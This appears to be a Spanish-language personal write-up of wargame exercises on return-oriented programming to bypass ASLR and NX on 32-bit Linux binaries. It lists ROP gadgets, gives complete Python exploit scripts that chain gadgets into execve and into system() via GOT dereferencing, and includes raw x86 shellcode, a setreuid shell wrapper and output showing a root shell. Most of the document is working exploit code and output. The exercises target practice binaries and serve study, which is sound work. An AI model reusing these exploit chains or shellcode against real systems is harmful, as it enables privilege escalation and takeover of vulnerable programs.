
## **ROP para saltarse ASLR**

Referencias:  
Para jugar: http://wargame2k10.nuitduhack.com/  
Para aprender: Http://danigargu.blogspot.com.es/2013/01/having-fun-with-rop-nxaslr-bypass-linux_18.html  


Básicamente se trata de seguir la guia de arriba, está muy bien escrita, todo un crack el que hace ese blog.
Se basa de seguir el ejercicio Level10-Ropme.

**1.- Usar ropeme(ropshell.py) para encontrar gagdgets con los que ir saltando de ret en ret para adecuar los registros y la pila a una llamada a execve**

```
./ropshell.py
generate ./level10_ropme
load ./level10_ropme.ggt
search ....
```

Gadgets a utilizar

```
    1.- 0x8052341L: pop edx ; pop ecx ; pop ebx ;;
    2.- 0x80853a6L: inc ecx ; adc al 0x39 ;;
    3.- 0x804ece9L: inc edx ; add al 0x83 ;;
    4.- 0x804825cL: xor eax eax ; inc eax ;;
    5.- 0x804825eL: inc eax ;;
    6.- 0x8048260L: int 0x80 ; pop ebp ;;
```

Con estos 6 gadgets tenemos suficiente para hacer una llamada a execve, ya que tenemos el control sobre eax (4, 5), ebx (1), ecx (1, 2) y edx (1, 3). Ahora tenemos que conseguir que dichos registros tengan los siguientes valores:

```
    EAX = 0xb (syscall execve)
    EBX = puntero a cadena
    ECX = 0x0 (NULL)
    EDX = 0x0 (NULL)
```

**2.- El puntero a cadena se puede solucionar de dos maneras dependiendo si tenemos ASLR activado:**

**- Sin ASLR:** Generamos una variable de entorno y pasamos esa dirección a EBX:  

```
export EGG='/bin/sh'  
./getenv EGG ./level10_ropme
Var is stored at address 0xbffffb76
Pointer: 0xbffffb76	 LongArg0: 8	 LongArg2: 15
EGG will be at 0xbffffb68
```	
		
	
El fichero python quedaría así:

```python
#!/usr/bin/python
#
# Exploit ROP
#
 
from struct import pack
 
binary = "level10"
junk = "A" * 12

shell_string = pack('<I', 0xbffffb68) # string: cntrl

 
rop = pack('<I', 0x08052318)    # pop edx 
rop += pack('<I', 0xffffffff)   # pop edx (ebx = 0xffffffff)
rop += pack('<I', 0x0806568a)	# pop ecx
rop += pack('<I', 0xffffffff)   # pop ecx (ebc = 0xffffffff)
rop += pack('<I', 0x08052343)	# pop ebx
rop += shell_string             # pop ebx (ebx = 0x080b1953)
rop += pack('<I', 0x080853a6)   # inc ecx ; adc al 0x39 ;; (ecx = 0x0)
rop += pack('<I', 0x080687c3)   # inc edx ; add al 0x83 ;; (edx = 0x0)
rop += pack('<I', 0x0804825c)   # xor eax eax ; inc eax ;; (eax = 0x1)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x2)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x3)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x4)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x5)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x6)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x7)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x8)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x9)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0xa)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x9)
rop += pack('<I', 0x08048260)   # int 0x80 ; pop ebp ;;
#rop += pack('<I', 0x08052a00)   # int 0x80 ; pop ebp ;;
rop += pack('<I', 0x0806568a)	# pop ecx

payload = junk + rop 
 
print payload

# Fin fichero python
```

Nota: Cuando llamas a int 0x80 no se puede utilizar solo la llamada a la función porque no funciona, tiene que tener otra microinstrucción detrás. Es algo raro para investigar:

```
rop += pack('<I', 0x08048260)   # int 0x80 ; pop ebp ;;
#rop += pack('<I', 0x08052a00)   # int 0x80 ;; <---- Con esto no funciona ¿?
```

**- Con ASLR:** Buscar una cadena en una sección no randomizable para luego crearnos un pequeño binario con el nombre de esa cadena que nos brinde un shell:
```
rabin2 -z level10_ropme | grep -A 4 cntrl
Warning: Cannot initialize dynamic strings
vaddr=0x080b1953 paddr=0x00069953 ordinal=738 sz=6 len=5 section=.rodata type=ascii string=cntrl
vaddr=0x080b195f paddr=0x0006995f ordinal=740 sz=6 len=5 section=.rodata type=ascii string=alnum
```
La dirección 0x080b1953 es la tendremos asignar a cntrl_string en exploit.py

Elegimos cntrl y nos creamos la shell:
```c	
cat cntrl.c
#include <stdio.h>
#include <unistd.h>

int main(void)
{
 int euid = geteuid();
 setreuid(euid, euid);
 execv("/bin/sh", NULL);
}
		
```		
```python
#!/usr/bin/python
#
# Exploit ROP con ASLR
#
 
from struct import pack
 
binary = "level10"
junk = "A" * 12
 
cntrl_string = pack('<I', 0x080b1953) # string: cntrl

rop = pack('<I', 0x08052341)    # pop edx ; pop ecx ; pop ebx ;;
rop += pack('<I', 0xffffffff)   # pop edx (ebx = 0xffffffff)
rop += pack('<I', 0xffffffff)   # pop ecx (ebc = 0xffffffff)
rop += cntrl_string             # pop ebx (ebx = 0x080b1953)
rop += pack('<I', 0x080853a6)   # inc ecx ; adc al 0x39 ;; (ecx = 0x0)
rop += pack('<I', 0x0804ece9)   # inc edx ; add al 0x83 ;; (edx = 0x0)
rop += pack('<I', 0x0804825c)   # xor eax eax ; inc eax ;; (eax = 0x1)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x2)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x3)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x4)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x5)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x6)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x7)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x8)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x9)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0xa)
rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0xb -> execve())
rop += pack('<I', 0x08048260)   # int 0x80 ; pop ebp ;;

fin = "\x90\x90\x90\x90\xfc\xf2\xff\xbf"
#payload = "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
payload = "\xeb\x10\x5e\x31\xc0\x88\x46\x07\xb0\x0b\x89\xf3\x31\xc9\x31\xd2\xcd\x80\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23"

payload = junk + rop 
 
print payload

# Fin fichero python
```
	
### ATACANDO EL GOT

Todo lo anterior está muy bien, pero si no tenemos una sección no randomizable tenemos un problema.

Ref: http://danigargu.blogspot.com.es/2013/02/got-dereferencing-overwriting-aslrnx.html	
Ref: ROP-libc.pdf

Lo que sigue es casi un copia y pega de las refencias anteriores. 

Como ver las propiedades de las secciones del binario:
```
	objdump -h binary
	readelf -S binary
```

La sección .got y .got.plt no son dinámicas (no afectadas por ASLR) y además son ejecutables. Es necesario que sean así porque son creadas por el linkador para saber donde están las librerías dinámicas. Ya que la GOT y la PLT se utilizan directamente desde cualquier parte del programa, necesitan disponer de una dirección estática conocida en la memoria. Además, la GOT necesita tener permisos de escritura, ya que cuando se resuelve la dirección de una función, es escrita en su correspondiente entrada de la GOT.

¿Y para qué se puede aprovechar todo esto?

Como las direcciones de la sección GOT son estáticas (no afectadas por ASLR), y se dispone de permisos de escritura, se puede aprovechar para sobreescribir la dirección de una función utilizada en el programa (p.e, strcpy), por otra con peores intenciones (p.e, system), de forma que cuando se invoque a la entrada PLT de la función sobreescrita, el flujo del programa vaya hacia la otra. 

Resolver direcciones de la libc

Perfecto, si se consigue sobreescribir el contenido de la GOT de una función por la dirección de otra función de la libc, es posible realizar cualquier llamada (incluido a las funciones no exportadas). Pero vaya, no es tan fácil como pinta, ya que la libc es afectada por ASLR y sus direcciones varían en cada ejecución. Pero no del todo ;-)

```
	1 offset = system() - strcpy()
	2 system() = strcpy() + offset
```
Para poder llevar a cabo esto, existen dos técnicas: GOT Dereferencing y GOT Overwriting, que sirven básicamente para re-calcular funciones de la libc a partir de la GOT de una función usada en el programa, empleando ROP.

GOT dereferencing: Consiste en combinar ROP gadgets para leer la dirección absoluta de cualquier función usada en el programa (p.e, strcpy) a partir su entrada en la GOT, utilizar dicha dirección para calcular la de otra función de la biblioteca (p.e, system), y realizar un salto hacia ella.

GOT overwriting: Es similar a la anterior, pero aquí en vez de leer la dirección de una función y calcular la de otra, se sobreescribe la entrada GOT de una de ellas (p.e, strcpy) con la dirección tiene más el offset de la función a usar (p.e, system). Por último, se invoca a la PLT de la función sobreescrita haciendo un ret2plt.

	
**1.- GOT DEFERENCING**
	
- Primero hago el ejemplo sencillo "stack1":

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Vemos que "peta" al sobrepasar 80 caracteres:
```
root@kali:~/Documents/Seccon# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 100 -q 0x37634136
[*] Exact match at offset 80
```
Las funciones que vamos a tener para calcular el offset con system:
```
objdump -t ./stack1 | grep GLIBC
00000000       F *UND*	00000000              __libc_start_main@@GLIBC_2.0
00000000       F *UND*	00000000              strcpy@@GLIBC_2.0
00000000       F *UND*	00000000              printf@@GLIBC_2.0
00000000       F *UND*	00000000              errx@@GLIBC_2.0
00000000       F *UND*	00000000              puts@@GLIBC_2.0
```

Aquí se muestran las llamadas a la función en el código ensamblador, en .plt y en la función main:
```
objdump -M intel -drw ./stack1 | grep strcpy -b3

1577:08048368 <strcpy@plt>:
1600- 8048368:	ff 25 10 97 04 08    	jmp    DWORD PTR ds:0x8049710
1662- 804836e:	68 10 00 00 00       	push   0x10
1706- 8048373:	e9 c0 ff ff ff       	jmp    8048338 <.plt>
--
6493- 8048497:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
6556- 804849b:	8d 44 24 1c          	lea    eax,[esp+0x1c]
6610- 804849f:	89 04 24             	mov    DWORD PTR [esp],eax
6669: 80484a2:	e8 c1 fe ff ff       	call   8048368 <strcpy@plt>
```
Valores que debemos calcular para preparar el exploit:

a) Saber el valor de "strcpy" en GOT, como vemos más arriba de PLT se llama a la función en GOT haciendo un "jmp DWORD PTR ds:0x8049710":
```
    	PLT:
	   0x8048368 <strcpy@plt>:	jmp    DWORD PTR ds:0x8049710 <-- Salto a la posición de strcpy en la GOT
	GOT:
	0x8049700:	0xb7fff918	0xb7feff40	0x0804834e	0xb7e10180
	0x8049710 <strcpy@got.plt>:	0xb7e7f2f0	0xb7e41930	0x0804838e	0x0804839e
```
   
b) Hallar el valor del offset, para ello podemos hacerlo de dos maneras:
- Mediante objdump:
```
	objdump -T /lib/i386-linux-gnu/libc.so.6 | egrep 'strcpy$|system$'
	00075580 g   iD  .text	00000042  GLIBC_2.0   strcpy
	0003ab30 g    DF .text	00000037  GLIBC_PRIVATE __libc_system
	0003ab30  w   DF .text	00000037  GLIBC_2.0   system
```
	Offset system-strcpy: 0003ab30-00075580 = 0xfffc55b0
		
- Directamente en gdb:
```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e32b30 <__libc_system>
gdb-peda$ p strcpy
$2 = {<text gnu-indirect-function variable, no debug info>} 0xb7e6d580 <strcpy>
gdb-peda$ p/x 0xb7e32b30-0xb7e6d580
$5 = 0xfffc55b0
```

Estos métodos anteriores no dan el valor del offset tal como pone en el blog, me daba error el exploit al probarlo calculándolo de esta manera. Al investigar un poco, he visto que el valor del "strcpy" no corresponde a 0xb7e6d580 ó 0x00075580, sino que se corresponde con el contenido que hay en la dirección [0x8049710] = 0xb7e7f2f0. De esta manera el valor correcto del offset sería: 0xb7e32b30(system) -  0xb7e7f2f0(strcpy) = 0xfffb3840
  
c) Hallar posición de memoria donde podamos guardar el offset calculado anteriormente, para eso necesitamos un lugar estático con permisos de escritura:
```
  readelf -S stack1 | grep "\.data"
  [24] .data             PROGBITS        08049720 000720 000008 00  WA  0   0  4
```
Recopilando, ya tenemos los 3 valores para armar el exploit:
```
strcpy@GOT: 0x8049710
Offset system-strcpy: 0xfffb3840
data: 0x08049720
```

Los pasos a seguir para construir el exploit serán los siguientes:

1) Para guardar el offset en una posicion de memoria que tenga permisos de escritura necesitaremos:
	- Instrucciones de ensamblador que nos guarde en un registro el valor donde vamos a guardar en memoria el offset (pop $reg)
	- Instrucciones para meter en esa posición de memoria el valor del offset (del tipo stor [reg] o add [reg])
	
2) Luego hay que poner la direccion de strcpy en un registro, para luego sumarle el offset así tenemos la llamada a system en un registro:
	- Instrucciones que nos guarde el valor del strcpy del GOT en un registro de la pila (pop $reg1)
	- Instrucciones para sumar el offset al valor anterior (add reg1 [reg2])

3) Por último hay que hacer la llamada a la función contenida en el registro (system):
	- Instrucciones de llamada: call reg1


Ahora es cuando empieza la búsqueda de "gadgets" (Eh la qui va là). Lógicamente lo que encontremos no va a coincidir exactamente con lo que necesitemos, pero podremos adaptarlo para que, con unas operaciones, haga lo que nosostros queremos. Para buscar estas instrucciones por las que vamos a ir saltando hasta conseguir la ejecución del exploit contamos con la ayuda de ROPeMe (https://github.com/packz/ropeme):

```
ROPeMe> generate stack1 5
Generating gadgets for stack1 with backward depth=5
It may take few minutes depends on the depth and file size...
Processing code block 1/1
Generated 96 gadgets
Dumping asm gadgets to file: stack1.ggt ...
OK
ROPeMe> search pop ? pop %
Searching for ROP gadget:  pop ? pop % with constraints: []
0x8048334L: pop eax ; pop ebx ; leave ;;
0x8048432L: pop ebx ; pop ebp ;;
0x8048577L: pop ebx ; pop ebp ;;
0x8048545L: pop ebx ; pop esi ; pop edi ; pop ebp ;;
0x8048594L: pop ecx ; pop ebx ; leave ;;
0x8048547L: pop edi ; pop ebp ; ret ; mov ebx [esp] ;;
0x8048547L: pop edi ; pop ebp ;;
0x8048546L: pop esi ; pop edi ; pop ebp ; ret ; mov ebx [esp] ;;
0x8048546L: pop esi ; pop edi ; pop ebp ;;
ROPeMe>  search xchg %
Searching for ROP gadget:  xchg % with constraints: []
0x804842bL: xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
0x804845cL: xchg esi eax ; add al 0x8 ; call eax ; leave ;;
ROPeMe> search add eax %
Searching for ROP gadget:  add eax % with constraints: []
0x8048429L: add eax 0x8049728 ; add [ebx+0x5d5b04c4] eax ;;
0x804856eL: add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;;
ROPeMe> search call eax %
Searching for ROP gadget:  call eax % with constraints: []
0x804845fL: call eax ; leave ;;
```
Vamos a usar los siguiente gadgets:

```
(1)0x8048545L: pop ebx ; pop esi ; pop edi ; pop ebp ;;
(2)0x804842bL: xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
(3)0x8048432L: pop ebx ; pop ebp ;;
(4)0x804856eL: add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;;
(5)0x804845fL: call eax ; leave ;;
```

Copio y pego del estupendo blog de referencia para este ejercicio donde está explicado mucho mejor que si lo intentara explicar yo:
```
"El gadget (1) lo usaremos para dar valor a los registros EBX y EDI que serán usados por el (2). Con el (2) haremos un intercambio de los valores de EAX y EDI, por lo que EAX obtendrá el valor de EDI (que controlamos). Luego, con el (2) sumaremos el valor de EAX al almacenado en [ebx+0x5d5b04c4]. Como también tenemos el control de EBX, utilizaremos este gadget para sumar el valor de EAX en donde queramos, previamente restando 0x5d5b04c4 a la dirección donde se va a escribir. Con el (3) restableceremos de nuevo el valor de EBX. Con el (4) leeremos un valor de [ebx-0xb8a0008] y se lo sumaremos a EAX. Y por ultimo, con el (5) realizaremos un salto a la dirección que apunta EAX.
¡Menudo jaleo!
La idea es utilizar el gadget (2) para escribir el offset entre system y strcpy en algún sitio con permisos de escritura, de forma que el registro EAX se quede con dicho offset. Luego, con el (4) sumar al offset que tenemos en EAX la dirección de strcpy obtenida de la GOT, teniendo en EAX un puntero a system. Por ultimo, con el (5), llamar a la función calculada."
```

Este sería mi script final haciendo los ajustes necesarios:

```python
#!/usr/bin/python

from struct import pack
junk = "A" * 64 + "dcba" + "A" * 12  # 80 bytes

## ROP gadgets ##
gadget1 = pack('<I', 0x8048545) # (1) pop ebx ; pop esi ; pop edi ; pop ebp ;;
gadget2 = pack('<I', 0x804842b) # (2) xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;
gadget3 = pack('<I', 0x8048432) # (3) pop ebx ; pop ebp ;;
gadget4 = pack('<I', 0x804856e) # (4) add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;;
gadget5 = pack('<I', 0x804845f) # (5) call eax ; leave ;;

# OPERACIONES CONDICIONADAS POR LOS GADGETS

padding = 0xcafedeef
offset = 0xfffb3840 - 0x8			# El offset hay que calcularlo en gdb, no funciona lo anterior
data = (0x08049720-0x5d5b04c4) & 0xFFFFFFFF 	# 0xaaa9925c
strcpy_got = (0x08049710+0xb8a0008)            	# 0x138E9718 strcpy@GOT + 0xb8a0008 for the gadget (4)
gnu_string = 0x8048154                          # "GNU\x00" from note.gnu.build-id

## PAYLOAD ##

# Primero tenemos que encontra una manera de guardar el offset en una posicion de memoria que tenga permisos de escritura

rop = gadget1              	# (1) pop ebx ; pop esi ; pop edi ; pop ebp ;;
rop += pack('<I', data)		# direccion donde se puede guardar datos readelf -S stack1 | grep "\.data" (0x08049720) --> pop ebx | A esta direccion 0x08049720 hay que restarle el valor de 0x5d5b04c4, ya que luego vamos a usar la instruccion "add [ebx+0x5d5b04c4] eax" en el gadget2. Valor=(0x08049720-0x5d5b04c4) & 0xFFFFFFFF = 0xaaa9925c
rop += pack('<I', padding)	# otro valor cualquiera --> pop esi
rop += pack('<I', offset)	# valor del offset (&system-&strcpy)(0xfffc55b0) --> pop edi | A este valor hay que restarle 0x8 condicionado por la instruccion "add al 0x8" del gadget2. Valor = 0xfffc55b0 - 0x8 = 0xfffc55a8
rop += pack('<I', padding)	# otro valor cualquiera --> pop ebp
rop += gadget2			# (2) xchg edi eax ; add al 0x8 ; add [ebx+0x5d5b04c4] eax ;;

# Ahora hay que poner la direccion de strcpy en un registro, para luego sumarle el offset y llegar a system ;-)

rop += gadget3                 	# (3) pop ebx ; pop ebp ;;
rop += pack('<I', strcpy_got)   # direccion de strcpy (0xb7e81580) | Hay que sumarle 0xb8a0008 condicionado por la instruccion "add eax [ebx-0xb8a0008]" del gadget4. Valor= 0xb7e81580 + 0xb8a0008 = 0xC3721588
rop += pack('<I', padding)		# otro valor cualquiera --> pop ebp
rop += gadget4                  # (4) add eax [ebx-0xb8a0008] ; add esp 0x4 ; pop ebx ; pop ebp ;; EAX = (OFFSET system-strcpy) + strcpy = SYSTEM ;D
rop += pack('<I', padding)		# otro valor cualquiera --> add esp 0x4
rop += pack('<I', padding)		# otro valor cualquiera --> pop ebx
rop += pack('<I', padding)		# otro valor cualquiera --> pop ebp

# Por ultimo llamamos a system

rop += gadget5                   # call eax ; leave ;;
rop += pack('<I', gnu_string)    # "GNU" string

payload = junk + rop

print payload
```

Para comprobar que funciona el èxploit tener en cuenta que le pasamos la cadena GNU que está en una determinada posición. Para averiguar la posición:
```
gdb-peda$ searchmem GNU 
Searching for 'GNU' in: None ranges
Found 17 results, display max 17 items:
    stack1 : 0x8048134 --> 0x554e47 ('GNU')
    stack1 : 0x8048154 --> 0x554e47 ('GNU')
```	    
Como no existe hay que crear un enlace  a sh desde esa cadena y meterle en el path:
```
  $ ln -s /bin/sh GNU
  $ ls -l GNU
  $ export PATH=.:$PATH
```
```
  ./stack1 $(python suyo.py)
  you have correctly got the variable to the right value
  #
``` 


El caso de cheer_msg (otro día...)


El valor fijo de printf es, aquí tener en cuenta que en la segunda llamada escribe en 

``` 
objdump -R cheer_msg | grep printf
0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
``` 

Dos maneras de calcular el offset respecto a printf por ejemplo:

a) Usando objdump:
``` 
objdump -T /lib/i386-linux-gnu/libc.so.6 | grep system
0003ab30  w   DF .text	00000037  GLIBC_2.0   system

objdump -T /lib/i386-linux-gnu/libc.so.6 | grep printf
00049930 g    DF .text	0000002a  GLIBC_2.0   printf
``` 
``` 
libc:
00049930 printf 
0003ab30 system

offset = system-printf = FFFFFFFFFFFF1200
``` 

b) Usando gdb:

``` 
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xb7e32b30 <__libc_system>
gdb-peda$ p printf
$2 = {<text variable, no debug info>} 0xb7e41930 <__printf>
gdb-peda$ p /x 0xb7e32b30-0xb7e41930
$3 = 0xffff1200
gdb-peda$ x/2i printf+0xffff1200
0xb7e32b30 <__libc_system>:	sub    esp,0xc
0xb7e32b33 <__libc_system+3>:	mov    eax,DWORD PTR [esp+0x10]
``` 



